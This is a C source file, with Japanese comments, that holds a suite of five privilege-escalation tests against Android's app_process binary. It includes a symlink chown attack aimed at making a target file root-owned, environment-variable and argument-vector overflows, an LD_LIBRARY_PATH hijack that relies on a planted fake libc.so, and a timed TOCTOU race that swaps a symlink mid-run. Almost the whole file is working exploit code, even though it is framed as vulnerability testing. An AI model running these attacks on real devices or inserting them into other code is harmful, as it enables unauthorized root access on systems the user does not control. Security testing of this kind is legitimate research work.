#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include <errno.h>
#include <sys/stat.h>
#include <fcntl.h>
#include "tests.h"

/* ================================================================
 * テスト1: シンボリックリンクを利用した chown/chmod 昇格
 * ================================================================ */
void test_symlink_chown(const char *app_path) {
    printf("\n[TEST-1] シンボリックリンク chown 攻撃\n");
    setup_test_environment();

    uid_t uid_before, gid_before;
    if (check_file_owner(TARGET_FILE, &uid_before, &gid_before) == 0) {
        printf("  変更前: %s (uid=%d, gid=%d)\n", TARGET_FILE, uid_before, gid_before);
    }

    char *envp[] = { "ANDROID_DATA=" TEST_DIR, NULL };
    char *argv[] = { (char*)app_path, "--zygote", NULL };

    int ret = run_app_process(app_path, argv, envp);
    printf("  app_process 終了コード: %d\n", ret);

    uid_t uid_after, gid_after;
    if (check_file_owner(TARGET_FILE, &uid_after, &gid_after) == 0) {
        printf("  変更後: %s (uid=%d, gid=%d)\n", TARGET_FILE, uid_after, gid_after);
        if (uid_after == 0 && gid_after == 0) {
            printf("  [!] 脆弱性確認: %s が root に変更されました！\n", TARGET_FILE);
        } else {
            printf("  [-] 権限変更なし (パッチ適用済み)\n");
        }
    }
    cleanup_test_environment();
}

/* ================================================================
 * テスト2: 環境変数 ANDROID_DATA の長大化 (スタック/ヒープ圧迫)
 * ================================================================ */
void test_env_overflow(const char *app_path) {
    printf("\n[TEST-2] 環境変数長過剰攻撃 (16KB)\n");
    setup_test_environment();

    char long_data[16384];
    memset(long_data, 'A', sizeof(long_data)-1);
    long_data[sizeof(long_data)-1] = '\0';
    char env_value[32768];
    snprintf(env_value, sizeof(env_value), "ANDROID_DATA=%s", long_data);

    char *envp[] = { env_value, NULL };
    char *argv[] = { (char*)app_path, "--help", NULL };

    printf("  環境変数サイズ: %zu バイト\n", strlen(env_value));
    int ret = run_app_process(app_path, argv, envp);
    if (ret == -1 || ret == 0) {
        printf("  プロセスが異常終了または強制終了 (カナリア検出の可能性)\n");
    } else {
        printf("  プロセス終了コード: %d (想定外の動作)\n", ret);
    }
    cleanup_test_environment();
}

/* ================================================================
 * テスト3: 大量の引数で Vector 増加を誘発
 * ================================================================ */
void test_argv_overflow(const char *app_path) {
    printf("\n[TEST-3] 引数ベクター過剰攻撃 (1000個の引数)\n");
    setup_test_environment();

    const int ARG_COUNT = 1000;
    char *argv[ARG_COUNT + 2];
    argv[0] = (char*)app_path;
    for (int i = 1; i <= ARG_COUNT; i++) {
        argv[i] = "-classpath";
    }
    argv[ARG_COUNT + 1] = NULL;

    char *envp[] = { "ANDROID_DATA=" TEST_DIR, NULL };
    int ret = run_app_process(app_path, argv, envp);
    printf("  終了コード: %d (メモリ枯渇や二重解放の有無を確認)\n", ret);
    cleanup_test_environment();
}

/* ================================================================
 * テスト4: LD_LIBRARY_PATH を用いた dlsym ハイジャック試行
 * ================================================================ */
void test_dl_hijack(const char *app_path) {
    printf("\n[TEST-4] 動的リンカハイジャック (LD_LIBRARY_PATH)\n");
    setup_test_environment();

    char *envp[] = {
        "LD_LIBRARY_PATH=/data/local/tmp",
        "ANDROID_DATA=" TEST_DIR,
        NULL
    };
    char *argv[] = { (char*)app_path, "--zygote", NULL };

    printf("  LD_LIBRARY_PATH を /data/local/tmp に設定\n");
    printf("  (このディレクトリに偽装 libc.so を配置しておくと検証可能)\n");
    int ret = run_app_process(app_path, argv, envp);
    printf("  終了コード: %d (setuid バイナリでは通常無視されます)\n", ret);
    cleanup_test_environment();
}

/* ================================================================
 * テスト5: TOCTOU 競合 (mkdir と chown の間にシンボリックリンクを差し替え)
 * ================================================================ */
void test_toctou_race(const char *app_path) {
    printf("\n[TEST-5] TOCTOU 競合 (mkdir -> chown の隙を突く)\n");
    setup_test_environment();

    // 事前に実ディレクトリを作成 (mkdir 成功させる)
    char real_cache[PATH_MAX];
    snprintf(real_cache, sizeof(real_cache), "%s/real_cache", TEST_DIR);
    mkdir(real_cache, 0755);
    // 最初は実ディレクトリへのリンク
    unlink(CACHE_DIR);
    symlink(real_cache, CACHE_DIR);

    pid_t pid = fork();
    if (pid == 0) {
        // 子プロセス: app_process を実行 (バックグラウンドで)
        char *envp[] = { "ANDROID_DATA=" TEST_DIR, NULL };
        char *argv[] = { (char*)app_path, "--zygote", NULL };
        execve(app_path, argv, envp);
        perror("execve child");
        exit(1);
    } else if (pid > 0) {
        // 親プロセス: mkdir が成功した直後 (適当なタイミング) にリンクを差し替える
        usleep(50000);  // 50ms 待機 (競合ウィンドウを狙う)
        unlink(CACHE_DIR);
        symlink(TARGET_FILE, CACHE_DIR);
        printf("  シンボリックリンクを %s に差し替えました\n", TARGET_FILE);

        int status;
        waitpid(pid, &status, 0);
        printf("  app_process 終了コード: %d\n", WEXITSTATUS(status));

        uid_t uid_after, gid_after;
        if (check_file_owner(TARGET_FILE, &uid_after, &gid_after) == 0) {
            if (uid_after == 0) {
                printf("  [!] TOCTOU 成功: %s が root になりました！\n", TARGET_FILE);
            } else {
                printf("  [-] TOCTOU 失敗 (タイミングが合わなかったかパッチ済み)\n");
            }
        }
    } else {
        perror("fork");
    }
    cleanup_test_environment();
}
